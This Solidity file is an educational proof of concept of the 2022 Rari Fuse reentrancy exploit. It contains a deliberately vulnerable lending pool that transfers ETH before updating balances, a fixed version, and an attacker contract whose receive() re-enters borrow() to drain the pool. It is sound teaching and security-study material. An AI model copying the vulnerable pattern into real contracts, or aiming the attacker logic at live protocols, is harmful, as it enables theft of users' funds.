// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/// @title Fei/Rari Fuse Pool PoC — Reentrancy in Compound-Fork Borrow
/// @notice Educational reproduction of the April 2022 exploit that drained
///         ~$80M from multiple Rari Capital Fuse pools (post-Fei merger).

/// @dev Minimal ERC20
contract MockToken {
    string public name;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name) { name = _name; }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev Simplified Compound-fork lending pool (Rari Fuse style)
///      Supports native ETH as one of the markets
contract VulnerableFusePool {
    MockToken public collateralToken;

    mapping(address => uint256) public collateralDeposited;
    mapping(address => uint256) public ethBorrowed;

    uint256 public totalETHReserves;
    uint256 public constant COLLATERAL_FACTOR = 7500; // 75%
    uint256 public constant BASIS = 10000;
    uint256 public constant ETH_PRICE = 1; // 1:1 for simplicity

    event CollateralDeposited(address indexed user, uint256 amount);
    event ETHBorrowed(address indexed user, uint256 amount);

    constructor(address _collateralToken) {
        collateralToken = MockToken(_collateralToken);
    }

    /// @notice Deposit ERC20 as collateral
    function depositCollateral(uint256 amount) external {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        collateralDeposited[msg.sender] += amount;
        emit CollateralDeposited(msg.sender, amount);
    }

    /// @notice Fund pool with ETH reserves
    function fundPool() external payable {
        totalETHReserves += msg.value;
    }

    /// @notice Borrow ETH against collateral — VULNERABLE
    /// @dev Sends ETH before updating borrow balance (CEI violation)
    function borrow(uint256 amount) external {
        uint256 maxBorrow = (collateralDeposited[msg.sender] * COLLATERAL_FACTOR) / BASIS;
        require(ethBorrowed[msg.sender] + amount <= maxBorrow, "exceeds collateral");
        require(address(this).balance >= amount, "insufficient ETH");

        // ❌ INTERACTION before EFFECTS
        // msg.sender.call{value:} triggers receive() in attacker contract
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "ETH transfer failed");

        // State update happens AFTER transfer — reentrancy window
        ethBorrowed[msg.sender] += amount;
        totalETHReserves -= amount;

        emit ETHBorrowed(msg.sender, amount);
    }

    /// @notice Check remaining borrow capacity
    function borrowCapacity(address user) external view returns (uint256) {
        uint256 maxBorrow = (collateralDeposited[user] * COLLATERAL_FACTOR) / BASIS;
        if (maxBorrow <= ethBorrowed[user]) return 0;
        return maxBorrow - ethBorrowed[user];
    }

    function getETHBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/// @dev Fixed version — CEI pattern + reentrancy guard
contract FixedFusePool {
    MockToken public collateralToken;
    bool private _locked;

    mapping(address => uint256) public collateralDeposited;
    mapping(address => uint256) public ethBorrowed;

    uint256 public totalETHReserves;
    uint256 public constant COLLATERAL_FACTOR = 7500;
    uint256 public constant BASIS = 10000;

    modifier nonReentrant() {
        require(!_locked, "reentrant call");
        _locked = true;
        _;
        _locked = false;
    }

    constructor(address _collateralToken) {
        collateralToken = MockToken(_collateralToken);
    }

    function depositCollateral(uint256 amount) external {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        collateralDeposited[msg.sender] += amount;
    }

    function fundPool() external payable {
        totalETHReserves += msg.value;
    }

    /// @notice Fixed borrow — state update BEFORE transfer + nonReentrant
    function borrow(uint256 amount) external nonReentrant {
        uint256 maxBorrow = (collateralDeposited[msg.sender] * COLLATERAL_FACTOR) / BASIS;
        require(ethBorrowed[msg.sender] + amount <= maxBorrow, "exceeds collateral");
        require(address(this).balance >= amount, "insufficient ETH");

        // ✅ EFFECTS before INTERACTION
        ethBorrowed[msg.sender] += amount;
        totalETHReserves -= amount;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "ETH transfer failed");
    }
}

/// @dev Attacker contract that re-enters borrow()
contract FuseAttacker {
    VulnerableFusePool public pool;
    uint256 public reentrancyCount;
    uint256 public maxReentrancy;
    uint256 public borrowAmount;

    constructor(address _pool) {
        pool = VulnerableFusePool(_pool);
        maxReentrancy = 4;
    }

    /// @notice Deposit collateral and trigger attack
    function attack(uint256 _borrowAmount) external {
        borrowAmount = _borrowAmount;
        reentrancyCount = 0;
        pool.borrow(_borrowAmount);
    }

    /// @notice Reentrancy via ETH receive
    receive() external payable {
        if (reentrancyCount < maxReentrancy && address(pool).balance >= borrowAmount) {
            reentrancyCount++;
            pool.borrow(borrowAmount);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
